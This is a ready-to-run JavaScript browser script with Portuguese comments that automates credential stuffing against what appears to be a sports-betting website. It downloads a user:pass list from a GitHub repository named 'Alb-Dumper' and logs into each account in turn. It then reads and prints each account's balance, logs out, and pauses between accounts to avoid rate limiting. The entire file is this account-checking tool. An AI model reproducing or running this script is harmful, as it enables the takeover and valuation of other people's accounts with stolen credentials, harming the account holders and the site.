// Função auxiliar para delay
function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Função para simular clique
function clickElement(selector) {
    const element = document.querySelector(selector);
    if (element) {
        element.click();
    } else {
        console.error(`Elemento não encontrado: ${selector}`);
    }
}

// Função para preencher campo de input
function fillInput(selector, value) {
    const element = document.querySelector(selector);
    if (element) {
        element.value = value;
        element.dispatchEvent(new Event('input', { bubbles: true }));
        element.dispatchEvent(new Event('change', { bubbles: true }));
    } else {
        console.error(`Elemento não encontrado: ${selector}`);
    }
}

// Função para extrair texto
function extractText(selector) {
    const element = document.querySelector(selector);
    if (element) {
        return element.textContent.trim();
    } else {
        console.error(`Elemento não encontrado: ${selector}`);
        return null;
    }
}

// Função principal para processar uma conta
async function processAccount(user, pass) {
    try {
        // 1. Clicar no botão de login
        clickElement('#root > div.application.application--sport > header > div > div.user-buttons > button:nth-child(2) > span');
        await delay(2000);

        // 2. Preencher campo de usuário
        fillInput('#root > div.overlay.modals-overlay > div > div > div.modal__content > div > div > div > form > div > div.form-row.form-row--input > div.form-input > div > input', user);
        await delay(4000);

        // 3. Preencher campo de senha
        fillInput('#root > div.overlay.modals-overlay > div > div > div.modal__content > div > div > div > form > div > div.form-row.form-row--password > div.password-input.form-input > div > input', pass);
        await delay(2000);

        // 4. Clicar no botão de login
        clickElement('#root > div.overlay.modals-overlay > div > div > div.modal__content > div > div > div > form > div > div.form-row.form-row--button > button > span');
        await delay(4000);

        // 5. Clicar no botão do menu do usuário
        clickElement('#root > div.application.application--sport > header > div > div.user-buttons > div > button > span');
        await delay(7000);

        // 6. Extrair o valor do saldo
        const balance = extractText('#root > div.overlay.menus-overlay > div > div > div > div.user-menu__info > div.user-menu__money > div.user-menu__money-details > div:nth-child(1) > span.money-details__value');
        console.log(`Saldo extraído para ${user}: ${balance}`);
        await delay(4000);

        // 7. Clicar no logout (assumindo que é o 14º item, ajuste se necessário)
        clickElement('#root > div.overlay.menus-overlay > div > div > div > div.user-menu__actions > a:nth-child(14) > div');
        await delay(2000); // Pequeno delay para logout processar

    } catch (error) {
        console.error(`Erro ao processar conta ${user}:`, error);
    }
}

// Função para buscar credenciais do GitHub
async function fetchCredentials() {
    try {
        const response = await fetch('https://raw.githubusercontent.com/realkooper77/Alb-Dumper/main/reta.txt');
        if (!response.ok) {
            throw new Error('Falha ao buscar credenciais');
        }
        const text = await response.text();
        const lines = text.split('\n').filter(line => line.trim() && line.includes(':'));
        const credentials = lines.map(line => {
            const [user, pass] = line.split(':').map(s => s.trim());
            return { user, pass };
        });
        return credentials;
    } catch (error) {
        console.error('Erro ao buscar credenciais:', error);
        return [];
    }
}

// Função principal para executar tudo sequencialmente
async function runAutomation() {
    const credentials = await fetchCredentials();
    if (credentials.length === 0) {
        console.error('Nenhuma credencial encontrada.');
        return;
    }

    for (const { user, pass } of credentials) {
        console.log(`Processando conta: ${user}`);
        await processAccount(user, pass);
        // Delay adicional entre contas para evitar rate limiting ou problemas
        await delay(5000);
    }
    console.log('Automação concluída.');
}

// Executar o script
runAutomation();
